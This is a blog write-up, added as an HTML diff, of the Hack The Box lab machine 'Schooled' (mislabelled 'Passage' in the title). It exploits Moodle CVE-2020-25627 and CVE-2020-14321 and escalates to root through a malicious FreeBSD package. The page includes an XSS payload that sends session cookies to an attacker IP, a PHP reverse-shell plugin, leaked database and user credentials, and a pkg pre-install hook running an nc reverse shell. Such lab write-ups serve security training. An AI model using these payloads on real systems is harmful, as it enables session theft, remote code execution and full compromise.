@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Exploiting Moodle vulnerabilities and FreeBSD custom pkg (Hackthebox - Passage Writeup) &mdash; fmash16's blog</title>
+<meta property="og:title" content="Exploiting Moodle vulnerabilities and FreeBSD custom pkg (Hackthebox - Passage Writeup)" />
+      <meta property="og:description" content="Exploiting stored XSS and privilege escalation from teacher to manager role on moodle. Creating a custom freebsd package to exploit sudo capabilities to pwn a machine " />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="https://fmash16.github.io/img/htb_schooled/card.png" />
+
+</head>
+
+<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
+<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
+ ___               _   ___   ___ 
+|  _|_____ ___ ___| |_|_  | |  _|
+|  _|     | .'|_ -|   |_| |_| . |
+|_| |_|_|_|__,|___|_|_|_____|___|
+                 ./fmash16's blog</pre>
+<nav>
+   <a href="/index.html">home</a>
+   <a href="/archive.html">archive</a>
+   <a href="mailto:fmash16@gmail.com">mail</a>
+   <a href="https://github.com/fmash16">github</a>
+   <!-- <a href="https://twitter.com/fmash16">twitter</a> -->
+   <a href="https://reddit.com/user/fmash16">reddit</a>
+   <a href="/about.html">whoami</a>
+</nav>
+
+<article>
+<input id="toggle" type="checkbox" checked>
+<label for="toggle">TOC</label>
+<nav class='toc'>
+    <ul>
+    <li><a href="#exploiting-moodle-vulnerabilities-and-freebsd-custom-pkg-hackthebox---passage-writeup">Exploiting Moodle vulnerabilities and FreeBSD custom pkg (Hackthebox - Passage Writeup)</a></li>
+    <li><a href="#nmap-scan">Nmap Scan</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+    <ul>
+    <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+    <li><a href="#stored-xss">Stored XSS</a>
+    <ul>
+    <li><a href="#session-hijack">Session Hijack</a></li>
+    </ul></li>
+    <li><a href="#moodle-privesc-to-manager">Moodle privesc to manager</a></li>
+    <li><a href="#reverse-shell---www-data">Reverse Shell - www-data</a></li>
+    </ul></li>
+    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a></li>
+    <li><a href="#privilege-escalation---root">Privilege Escalation - root</a>
+    <ul>
+    <li><a href="#creating-a-custom-pkg-on-freebsd">Creating a custom pkg on FreeBSD</a></li>
+    </ul></li>
+    </ul>
+</nav>
+<h1 id="exploiting-moodle-vulnerabilities-and-freebsd-custom-pkg-hackthebox---passage-writeup">Exploiting Moodle vulnerabilities and FreeBSD custom pkg (Hackthebox - Passage Writeup)</h1>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<ul>
+<li>22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)</li>
+<li>80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
+<ul>
+<li>Potentially risky methods: TRACE</li>
+</ul></li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="subdomain-enumeration">Subdomain Enumeration</h2>
+<p>We enumerate for possible available subdomains using ffuf</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="at">-c</span> <span class="at">-w</span> /usr/share/dnsrecon/subdomains-top1mil-5000.txt <span class="at">-u</span> http://schooled.htb <span class="at">-H</span> <span class="st">&quot;Host: FUZZ.schooled.htb&quot;</span> <span class="at">-fw</span> 5338</span></code></pre></div>
+<p>Found a subdomain <code>moodle</code>. So we add <code>moodle.schooled.htb</code> to our <code>/etc/hosts</code> file. Going to the site, we find a moodle site. We create a student account with the mail <code>name@student.schooled.htb</code> and login.</p>
+<p>We see that we can only enroll ourselves in the Maths course. Enrolling ourselves, we see an anouncement where the teacher Manuel Phillips says that in order to be in the course, we must set our MoodleNet profile, or we would not be allowed in. We can set our moodlenet profile from our <code>Preferences &gt; Edit Profile</code> options.</p>
+<h2 id="stored-xss">Stored XSS</h2>
+<p>Now, looking around for moodle vulnerabilities, we find that the moodlenet profile field is vulnerable to stored XSS. This vulnerability is assigned CVE-2020-25627. It has been patched in <a href="https://moodle.org/mod/forum/discuss.php?d=410839">this</a> on the moodle forums. This vulnerability occurs due to the fact that the input is not sanitized. It has been patched as follows:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">--- a/admin/tool/moodlenet/classes/profile_manager.php</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/admin/tool/moodlenet/classes/profile_manager.php</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -46,7 +46,7 @@ class profile_manager {</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>             $user = \core_user::get_user($userid, &#39;moodlenetprofile&#39;);</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>             try {</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>                 $userprofile = $user-&gt;moodlenetprofile ? $user-&gt;moodlenetprofile : &#39;&#39;;</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="st">-                return (isset($user)) ? new moodlenet_user_profile($userprofile, $userid) : null;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="va">+                return (isset($user)) ? new moodlenet_user_profile(s($userprofile), $userid) : null;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>             } catch (\moodle_exception $e) {</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>                 // If an exception is thrown, means there isn&#39;t a valid profile set. No need to log exception.</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>                 return null;</span></code></pre></div>
+<p>Stored XSS allows the input to be displayed as HTML whenever the page is loaded. So, we can put in a malicious javascript code inside and whoever loads the page would run that script inside his browser session, and we can steal his cookies and sessions and what not. We use this attack to steal the login session of the teacher, since he would check our profile and thus load our profile page, and run the script in his browser. This is called <code>Session Hijack</code>.</p>
+<p>If we check our own cookies for the moodle site, we can find a cookie named <code>session</code>. So we can use this session hijack attack.</p>
+<h3 id="session-hijack">Session Hijack</h3>
+<p>So, we write the following script and insert it into the moodlenet field and save our profile.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span><span class="kw">new</span> <span class="fu">Image</span>()<span class="op">.</span><span class="at">src</span><span class="op">=</span><span class="st">&quot;http://10.10.16.1/bogus.php?output=&quot;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<p>What happens here is that, we put a new image element in the html using the script, and we use the image source to a bogus php file on our local machine. The php takes the var output which is the <code>document.cookie</code>, the cookie that stores the login session of the teacher. As the teacher’s browser makes the HTTP request for the image along with the cookie, we can intercept the request by opening a netcat listener on the HTTP port 80 on our local machine and keep waiting.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 80</span></code></pre></div>
+<p>After some time, we get a hit with the session cookie of the teacher.</p>
+<p><img src="/img/htb_schooled/1.png" /></p>
+<p>Now, we can edit our own session cookie with the obtained value for the teacher and get logged in as the teacher manuesl_phillips.</p>
+<h2 id="moodle-privesc-to-manager">Moodle privesc to manager</h2>
+<p>From the main website, in the teachers section, we find that Lianne Carter is the manager. The manager has administrative capabilities, and we check if we can in any way privesc to that role. Looking around for a long time, and finally with the help of a nudge, found a vulnerability that allows privesc from teacher to manager <a href="https://github.com/HoangKien1020/CVE-2020-14321">here.</a> This has been assigned the CVE-2020-14321. This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role. The PoC video can be found <a href="https://vimeo.com/441698193">here</a>.</p>
+<p>This vulnerability has been pathced in <a href="https://moodle.org/mod/forum/discuss.php?d=407393">this</a> post on moodle. This vulnerability happens due to the fact that moodle did not check if the logged in user has the <code>capability</code> to assign certain roles to other users. Moreover, it also did not check if the user can be assigned certain roles in the given <code>context</code> in moodle, for example, in the course. A context is combined with role permissions to define a User’s capabilities on any page in Moodle.</p>
+<p>So, adding a manager as a new student to the course, we can intercept the request and give ourselves, the teacher <code>role_id=1</code> which is the manager role. Then as a manager, we can login as other managers, the main manager, who has capability to edit the moodle. The patch applied to fix this:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">--- a/enrol/manual/ajax.php</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/enrol/manual/ajax.php</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -100,6 +100,13 @@ switch ($action) {</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>         if (empty($roleid)) {</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>             $roleid = null;</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="va">+        } else {</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="va">+            if (!has_capability(&#39;moodle/role:assign&#39;, $context)) {</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="va">+                throw new enrol_ajax_exception(&#39;assignnotpermitted&#39;);</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="va">+            }</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="va">+            if (!array_key_exists($roleid, get_assignable_roles($context, ROLENAME_ALIAS, false))) {</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="va">+                throw new enrol_ajax_exception(&#39;invalidrole&#39;);</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="va">+            }</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>         }</span></code></pre></div>
+<p>Following the PoC video, we assign our teacher to manager role, and then we login as the manager from the teacher session, and enable installation of plugins, using the <code>rce.zip</code> file as provided by the PoC author, we can get remote code execution. We needed to change the version info in the zip file. We unzip the zip file and find a <code>version.php</code> file. Trying to install the rce.zip plugin as is gives us the version number of the moodle on the server <code>20200615</code>, we put this version number in the file and then install it to make it work.</p>
+<h2 id="reverse-shell---www-data">Reverse Shell - www-data</h2>
+<p>Using different reverse shell oneliners faile using this rce. So , we upload our own php reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php">here</a>. We put the php reverse shell in place of <code>block_rce.php</code> and rename the plugin to <code>rev</code>. Now we open a nc listerner and install the plugin and go to the url as in the PoC, to get a reverse shell.</p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<p>We find 2 users on the box 1. jamie 2. steve</p>
+<p>Enumerating the box, we were able to find mysql database creds. Reading the man docs for apache on freebsd, we see that the document root for apache is <code>/usr/local/www/data</code>. Going around, we find the site and the moodle data. In the config file <code>config.php</code> of moodle, we find mysql database user and password.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /usr/local/www/apache24/data/moodle/config.php</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>$CFG-&gt;dbname    = &#39;moodle&#39;</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>$CFG-&gt;dbuser    = &#39;moodle&#39;</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>$CFG-&gt;dbpass    = &#39;PlaybookMaster2020&#39;</span></code></pre></div>
+<p>So we have a database <code>moodle.db</code>, by the user moodle and got the password for the user. Using the obtained creds, we login and view the database using the following commands</p>
+<blockquote>
+<p>the command mysql won’t work because it is not in PATH. If we echo the PATH, we see that /usr/local/bin is not included. The binary of mysql is located in the /usr/local/bin. So, we have to use the absolute path</p>
+</blockquote>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/mysql</span> <span class="at">-u</span> moodle <span class="at">-pPlaybookMaster2020</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">use</span> moodle<span class="kw">;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">show</span> tables<span class="kw">;</span></span></code></pre></div>
+<p>From the tables, we find the table named <code>mdl_user</code> which seems interesting. We view the table using</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="cf">select</span> <span class="ex">*</span> from mdl_user<span class="kw">;</span></span></code></pre></div>
+<p>We see that the tables spits out many moodle users and their passowrd hashes. We find our user <code>jamie</code> among them and obtain the password hash.</p>
+<p>We store the hash in a file named <code>jamie_hash</code> and use john to crack the hash</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> jamie_hash <span class="at">-w</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt</span></code></pre></div>
+<p>And after some time, get a hit. Obtained creds:</p>
+<blockquote>
+<p>jamie:!QAZ2wsx</p>
+</blockquote>
+<p>Now we can ssh into the machine as user jamie.</p>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<p>Logging in as jamie, the first thing we do is check the sudo capabilities of the user using <code>sudo -l</code> and find the following.</p>
+<p>So we can update the pkg repos and install any package as root. This means we can try to create a malicious package that we can install and get it executed by root somehow to obtoain root privileges. About creating custom pkgs, <a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">here</a> is an awesome blog on it.</p>
+<h2 id="creating-a-custom-pkg-on-freebsd">Creating a custom pkg on FreeBSD</h2>
+<p>Reading the docs for <code>pkg</code> from <a href="https://github.com/freebsd/pkg#pkgfmt">github</a>, we get a template for the <code>+MANIFEST</code> file which contains all the information of the package. We can include different scripts here that gets executed such as:</p>
+<ul>
+<li>pre-install</li>
+<li>post-install</li>
+<li>install</li>
+<li>pre-deinstall</li>
+<li>post-deinstall</li>
+<li>deinstall</li>
+<li>pre-upgrade</li>
+<li>post-upgrade</li>
+<li>upgrade</li>
+</ul>
+<p>We can use the <code>pre-install</code> to execute a reverse shell script that will then get executed as root as we install the package as sudo and thus we can get root. The <code>pkg create</code> command tars the directory with the <code>+MANIFEST</code> file and zips it using the <code>xz</code> format by default. We can then install the package using the <code>pkg install</code> command as sudo.</p>
+<p>Using the template, and using only what’s necessary we write the following MANIFEST containing our reverse shell</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">name:</span> foo</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">version:</span> 1.0</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">origin:</span> category/foo</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">comment:</span> this is foo package</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">arch:</span> i386</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="ex">www:</span> http://www.foo.org</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="ex">maintainer:</span> foo@bar.org</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="ex">prefix:</span> /usr/local</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="ex">licenselogic:</span> or</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="ex">licenses:</span> [MIT, MPL]</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a><span class="ex">desc:</span> <span class="op">&lt;&lt;EOD</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="st">  This is the description</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a><span class="st">  Of foo</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a><span class="st">  A component of bar</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a><span class="op">EOD</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a><span class="ex">categories:</span> [bar, plop]</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a><span class="ex">deps:</span> {</span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a><span class="ex">files:</span> {</span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a><span class="ex">directories:</span> {</span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a><span class="ex">scripts:</span> {</span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>  <span class="ex">post-install:</span> <span class="op">&lt;&lt;EOD</span></span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a><span class="st">    #!/bin/sh</span></span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a><span class="st">    echo post-install</span></span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a><span class="op">EOD</span></span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a>  <span class="ex">pre-install:</span> <span class="op">&lt;&lt;EOD</span></span>
+<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a><span class="st">    #!/bin/sh</span></span>
+<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a><span class="st">    echo pre-install</span></span>
+<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a><span class="st">    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.1 4242 &gt;/tmp/f</span></span>
+<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a><span class="op">EOD</span></span>
+<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span></code></pre></div>
+<p>We keep the MANIFEST file in a directory named <code>foo</code>. And then run the following to create and install the pkg</p>
+<blockquote>
+<p>just pkg install command fails on repo update, so we skip the update using the “–no-repo-update” flag</p>
+</blockquote>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pkg</span> create <span class="at">-m</span> foo/ <span class="at">-r</span> foo/ <span class="at">-o</span> ./</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> /usr/sbin/pkg install <span class="at">--no-repo-update</span> foo-1.0.txz</span></code></pre></div>
+<p>Opening a nc listener on port 4242, after some time, we get a reverse shell back as root.</p>
+</article>
+
+<footer>
+  <hr>
+  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
+  <i class="far fa-copyright"></i> 2020-2021 </p>
+</footer>
+</body>
